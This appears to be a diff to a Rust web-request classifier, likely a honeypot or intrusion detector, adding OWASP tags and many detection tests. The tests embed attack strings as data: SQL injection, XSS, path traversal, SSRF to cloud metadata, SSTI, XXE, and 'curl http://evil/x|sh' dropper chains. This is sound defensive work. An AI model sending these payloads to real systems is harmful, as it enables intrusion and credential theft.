@@ -36,6 +36,7 @@ pub struct Verdict {
     pub severity: u8,
     pub scan_level: u8,
     pub labels: Vec<String>,
+    pub owasp: Vec<String>,
 }
 
 struct CompiledRule {
@@ -48,6 +49,7 @@ struct CompiledRule {
     ua: Option<Regex>,
     header: Option<Regex>,
     path_exact: Option<String>,
+    owasp: Vec<String>,
 }
 
 /// Decode a request target or body for matching: up to two passes of
@@ -205,6 +207,7 @@ impl Classifier {
                     ua: r.ua_regex.as_deref().map(compile_ci).transpose()?,
                     header: r.header_regex.as_deref().map(compile_ci).transpose()?,
                     path_exact: r.path_exact,
+                    owasp: r.owasp.unwrap_or_default(),
                 })
             })
             .collect::<Result<Vec<_>>>()?;
@@ -213,6 +216,7 @@ impl Classifier {
 
     pub fn classify(&self, req: &RequestView, hist: &IpHistory, bot: &BotTells) -> Verdict {
         let mut labels: Vec<String> = vec![];
+        let mut owasp: Vec<String> = vec![];
         let mut weight: u8 = 0;
 
         let target = match req.query {
@@ -269,6 +273,7 @@ impl Classifier {
                 });
             if hit {
                 labels.push(r.label.clone());
+                owasp.extend(r.owasp.iter().cloned());
                 weight = weight.max(r.weight);
             }
         }
@@ -319,11 +324,14 @@ impl Classifier {
 
         labels.sort();
         labels.dedup();
+        owasp.sort();
+        owasp.dedup();
         let scan_level = weight.min(4);
         Verdict {
             severity: weight,
             scan_level,
             labels,
+            owasp,
         }
     }
 }
@@ -360,6 +368,30 @@ mod tests {
             distinct_paths_1h: paths,
             requests_1h: reqs,
         }
+    }
+
+    #[test]
+    fn hit_rules_contribute_owasp_tags() {
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/login",
+                Some("id=1%27%20OR%201%3D1--"),
+                "curl/8",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
+        assert_eq!(v.owasp, vec!["A03:2021".to_string()]);
+        // A request hitting no signature rule has no tags.
+        let plain = classifier().classify(
+            &view("GET", "/nonexistent", None, "Mozilla/5.0", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(plain.owasp.is_empty(), "{:?}", plain.owasp);
     }
 
     #[test]
@@ -843,12 +875,18 @@ mod tests {
             "Wfuzz/3.1.0",
             "dirb",
             "httpx - Open-source project (github.com/projectdiscovery/httpx)",
+        ] {
+            let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
+            assert!(l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
+        }
+        // Research scanners carry their own label since the scanners split.
+        for ua in [
             "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
             "Expanse, a Palo Alto Networks company, searches across the global IPv4 space",
             "l9explore/1.2.2",
         ] {
             let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
-            assert!(l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
+            assert!(l.iter().any(|x| x == "research-scanner"), "{ua}: {l:?}");
         }
         for ua in [
             "python-httpx/0.27.0",
@@ -1017,5 +1055,666 @@ mod tests {
         bomb.write_all(&vec![b'a'; 4 * 1024 * 1024]).unwrap();
         let bomb = bomb.finish().unwrap();
         assert_eq!(decoded_body(&h, &bomb).len() as u64, MAX_DECODED_BODY);
+    }
+
+    #[test]
+    fn sqli_additions_are_caught() {
+        for q in [
+            "id=1;waitfor%20delay%20'0:0:5'",
+            "id=1%20or%20pg_sleep(5)--",
+            "id=1%20union%20select%20load_file('/etc/passwd')",
+            "id=1;exec%20xp_cmdshell%20'whoami'",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/item", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "sqli"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn xss_additions_are_caught() {
+        for q in [
+            "q=<svg/onload=alert(1)>",
+            "q=%3Cimg%20src=x%20onerror=alert(1)%3E",
+            "q=<iframe%20src=//evil>",
+            "q=alert(document.cookie)",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/search", Some(q), "Mozilla/5.0", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "xss"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn traversal_additions_are_caught() {
+        for q in [
+            "f=..;/..;/etc/passwd",
+            "f=php://filter/convert.base64-encode/resource=index.php",
+            "f=/etc/shadow",
+            "f=/proc/version",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/x", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "path-traversal"),
+                "{q}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn rce_dropper_chain_in_query_is_caught() {
+        for q in [
+            "u=a;wget%20http://evil/x",
+            "u=a;curl%20http://evil/x|sh",
+            "u=a;busybox%20wget%20http://evil",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/ping", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "rce"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn backup_and_debug_paths_are_sensitive() {
+        for p in [
+            "/backup.sql",
+            "/www.zip",
+            "/app_dev.php",
+            "/_profiler/",
+            "/elmah.axd",
+            "/debug/vars",
+            "/web.config",
+            "/composer.json",
+            "/terraform.tfstate",
+            "/id_rsa",
+            "/.kube/config",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "sensitive-path"),
+                "{p}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn iot_probe_additions_are_caught() {
+        for p in [
+            "/picsdesc.xml",
+            "/ctrlt/DeviceUpgrade_1",
+            "/setup.cgi?next_file=netgear.cfg",
+            "/JNAP/",
+            "/SDK/webLanguage",
+            "/doc/page/login.asp",
+            "/RPC2_Login",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "iot-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn research_scanner_uas_get_their_own_label() {
+        for ua in [
+            "CensysInspect/1.1",
+            "Expanse, a Palo Alto Networks company",
+            "Mozilla/5.0 (compatible; shadowserver)",
+            "binaryedge-bot",
+            "stretchoid",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/", None, ua, None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "research-scanner"),
+                "{ua}: {:?}",
+                v.labels
+            );
+        }
+        let v = classifier().classify(
+            &view("GET", "/", None, "sqlmap/1.7", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.contains(&"scanner-ua".to_string()));
+        assert!(!v.labels.contains(&"research-scanner".to_string()));
+    }
+
+    #[test]
+    fn ssrf_to_cloud_metadata_is_level_4() {
+        for q in [
+            "url=http://169.254.169.254/latest/meta-data/",
+            "u=http%3a%2f%2fmetadata.google.internal%2f",
+            "next=http://169.254.170.2/v2/credentials",
+            "feed=http://100.100.100.200/latest/meta-data/",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/fetch", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
+            assert_eq!(v.scan_level, 4);
+        }
+    }
+
+    #[test]
+    fn ssrf_params_to_internal_hosts_but_not_plain_paths() {
+        for q in [
+            "url=http://127.0.0.1:8080/",
+            "callback=http://192.168.1.1/",
+            "webhook=http://2130706433/",
+            "u=http://0x7f000001/",
+            "image=http://10.0.0.4/x",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/proxy", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
+        }
+        // A private IP in a path, or in an unrelated parameter, is not SSRF.
+        for (p, q) in [
+            ("/blog/192.168.1.1-release", None),
+            ("/fetch", Some("name=127.0.0.1")),
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, q, "Mozilla/5.0", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                !v.labels.iter().any(|l| l == "ssrf"),
+                "{p} {q:?}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn ssti_probes_are_level_4() {
+        for q in [
+            "q={{7*7}}",
+            "q=%7b%7bconfig%7d%7d",
+            "q=${7*7}",
+            "q=<%=7*7%>",
+            "q={{request.application.__globals__}}",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/search", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "ssti"), "{q}: {:?}", v.labels);
+            assert_eq!(v.scan_level, 4);
+        }
+    }
+
+    #[test]
+    fn nosqli_operators_are_caught() {
+        for q in ["user[$ne]=1", "user[$gt]="] {
+            let v = classifier().classify(
+                &view("GET", "/login", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "nosqli"),
+                "{q}: {:?}",
+                v.labels
+            );
+        }
+        for b in [
+            &b"{\"$where\": \"1==1\"}"[..],
+            &b"{\"user\": {\"$gt\": \"\"}}"[..],
+        ] {
+            let v = classifier().classify(
+                &view("POST", "/login", None, "curl/8", Some(b)),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "nosqli"),
+                "{b:?}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn xxe_in_a_body_is_caught() {
+        let b = br#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#;
+        let v = classifier().classify(
+            &view("POST", "/xml", None, "curl/8", Some(b)),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "xxe"), "{:?}", v.labels);
+        assert_eq!(v.scan_level, 4);
+    }
+
+    #[test]
+    fn crlf_in_the_target_is_caught() {
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/redir",
+                Some("next=a%0d%0aSet-Cookie:%20x"),
+                "curl/8",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "crlf-injection"),
+            "{:?}",
+            v.labels
+        );
+        assert_eq!(v.scan_level, 3);
+        let plain = classifier().classify(
+            &view("GET", "/redir", Some("next=/home"), "Mozilla/5.0", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            !plain.labels.iter().any(|l| l == "crlf-injection"),
+            "{:?}",
+            plain.labels
+        );
+    }
+
+    #[test]
+    fn webshell_probes_are_level_3_and_interaction_is_level_4() {
+        for p in [
+            "/shell.php",
+            "/alfa.php",
+            "/wso.php",
+            "/c99.php",
+            "/x.php",
+            "/1.php",
+            "/wp-content/uploads/evil.php",
+            "/.well-known/shell.phtml",
+            "/images/cmd.php",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "webshell-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 3, "{p}");
+        }
+        for (p, q) in [("/shell.php", "cmd=id"), ("/index.php", "z0=aWQ9")] {
+            let v = classifier().classify(
+                &view("GET", p, Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "webshell"),
+                "{p}?{q}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 4, "{p}?{q}");
+        }
+        // A generic script with a generic parameter is not a webshell.
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/index.php",
+                Some("action=edit"),
+                "Mozilla/5.0",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(!v.labels.iter().any(|l| l == "webshell"), "{:?}", v.labels);
+    }
+
+    #[test]
+    fn deserialization_markers_are_level_4() {
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/api",
+                Some("data=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0"),
+                "curl/8",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "deserialization"),
+            "{:?}",
+            v.labels
+        );
+        let v = classifier().classify(
+            &view("GET", "/api", Some("payload=aced0005sr"), "curl/8", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "deserialization"),
+            "{:?}",
+            v.labels
+        );
+        for b in [
+            &br#"O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}"#[..],
+            &br#"{"rce":"_$$ND_FUNC$$_function(){return 1}"}"#[..],
+        ] {
+            let v = classifier().classify(
+                &view("POST", "/api", None, "curl/8", Some(b)),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "deserialization"),
+                "{b:?}: {:?}",
+                v.labels
+            );
+        }
+        // Accepted magic-bytes cost: a word containing rO0AB trips the Java
+        // signature. Pinned as a positive assertion so any future tightening
+        // is a deliberate act, not an accident.
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/order",
+                Some("status=rO0ABort"),
+                "Mozilla/5.0",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "deserialization"),
+            "{:?}",
+            v.labels
+        );
+    }
+
+    #[test]
+    fn ai_infrastructure_probes_are_level_2() {
+        for p in [
+            "/v1/models",
+            "/v1/chat/completions",
+            "/api/generate",
+            "/api/tags",
+            "/api/chat",
+            "/tree",
+            "/api/terminals",
+            "/gradio_api/info",
+            "/api/2.0/mlflow/experiments/list",
+            "/.well-known/ai-plugin.json",
+            "/model.safetensors",
+            "/collections",
+            "/v1/schema",
+            "/api/v1/chatflows",
+            "/console/api/setup",
+            "/rest/credentials",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "ai-infra-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 2, "{p}");
+        }
+    }
+
+    #[test]
+    fn mcp_probes_are_level_3_and_abuse_is_level_4() {
+        let v = classifier().classify(
+            &view("GET", "/mcp", None, "curl/8", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "mcp-probe"), "{:?}", v.labels);
+        assert_eq!(v.scan_level, 3);
+        let b = br#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#;
+        let v = classifier().classify(
+            &view("POST", "/mcp", None, "curl/8", Some(b)),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "mcp-probe"), "{:?}", v.labels);
+        let b = br#"{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"file:///etc/passwd"}}"#;
+        let v = classifier().classify(
+            &view("POST", "/mcp", None, "curl/8", Some(b)),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "mcp-abuse"), "{:?}", v.labels);
+        assert_eq!(v.scan_level, 4);
+    }
+
+    #[test]
+    fn cloud_control_plane_probes_are_level_3() {
+        for p in [
+            "/api/v1/namespaces",
+            "/api/v1/pods",
+            "/api/v1/secrets",
+            "/_ping",
+            "/v1.24/containers/json",
+            "/v1/agent/self",
+            "/v1/sys/seal-status",
+            "/v2/keys/",
+            "/config_dump",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "cloud-infra-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 3, "{p}");
+        }
+        // A generic application API is not the Kubernetes API.
+        let v = classifier().classify(
+            &view("GET", "/api/v1/users", None, "Mozilla/5.0", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            !v.labels.iter().any(|l| l == "cloud-infra-probe"),
+            "{:?}",
+            v.labels
+        );
+    }
+
+    #[test]
+    fn api_recon_and_graphql_introspection() {
+        for p in [
+            "/graphql",
+            "/swagger/v1/swagger.json",
+            "/openapi.json",
+            "/api-docs",
+            "/redoc",
+            "/graphiql",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "api-recon"),
+                "{p}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 2, "{p}");
+        }
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/graphql",
+                Some("query={__schema{types{name}}}"),
+                "curl/8",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "graphql-introspection"),
+            "{:?}",
+            v.labels
+        );
+        assert_eq!(v.scan_level, 3);
+        let b = br#"{"query":"query IntrospectionQuery { __schema { types { name } } }"}"#;
+        let v = classifier().classify(
+            &view("POST", "/graphql", None, "curl/8", Some(b)),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            v.labels.iter().any(|l| l == "graphql-introspection"),
+            "{:?}",
+            v.labels
+        );
+    }
+
+    #[test]
+    fn default_credentials_are_a_credential_attack() {
+        for b in [
+            &b"username=admin&password=admin"[..],
+            &b"login=root&pwd=t0talc0ntr0l4%21"[..],
+            &b"user=ubnt&pass=ubnt"[..],
+        ] {
+            let v = classifier().classify(
+                &view("POST", "/login", None, "curl/8", Some(b)),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "credential-attack"),
+                "{b:?}: {:?}",
+                v.labels
+            );
+        }
+        // base64 admin:admin in an Authorization header.
+        let req = RequestView {
+            method: "GET",
+            path: "/manager/html",
+            query: None,
+            headers: vec![("authorization".into(), "Basic YWRtaW46YWRtaW4=".into())],
+            body: None,
+            proxy_target: None,
+        };
+        let v = classifier().classify(&req, &hist(1, 1), &BotTells::default());
+        assert!(
+            v.labels.iter().any(|l| l == "credential-attack"),
+            "{:?}",
+            v.labels
+        );
+        // A unique password is not a default-credential attack.
+        let v = classifier().classify(
+            &view(
+                "POST",
+                "/login",
+                None,
+                "Mozilla/5.0",
+                Some(b"username=a&password=xK9%21mQ2"),
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(
+            !v.labels.iter().any(|l| l == "credential-attack"),
+            "{:?}",
+            v.labels
+        );
+    }
+
+    #[test]
+    fn app_probes_are_level_3() {
+        for p in [
+            "/wls-wsat/CoordinatorPortType",
+            "/console/css/",
+            "/script",
+            "/user/register?element_parents=account/mail/%23value",
+            "/index.php?option=com_users",
+            "/downloader/",
+            "/app/etc/local.xml",
+            "/setup/setupadministrator/",
+            "/app/rest/users/id:1/tokens/RPC2",
+            "/webtools/control/main",
+            "/CFIDE/administrator/",
+            "/_layouts/15/",
+            "/zimbraAdmin/",
+            "/struts/login.action",
+            "/solr/admin/cores",
+            "/geoserver/web/",
+        ] {
+            let (path, query) = p
+                .split_once('?')
+                .map(|(a, b)| (a, Some(b)))
+                .unwrap_or((p, None));
+            let v = classifier().classify(
+                &view("GET", path, query, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "app-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+            assert_eq!(v.scan_level, 3, "{p}");
+        }
+        // A plural users path is not Drupal's /user/*.
+        let v = classifier().classify(
+            &view("GET", "/users/register", None, "Mozilla/5.0", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(!v.labels.iter().any(|l| l == "app-probe"), "{:?}", v.labels);
     }
 }
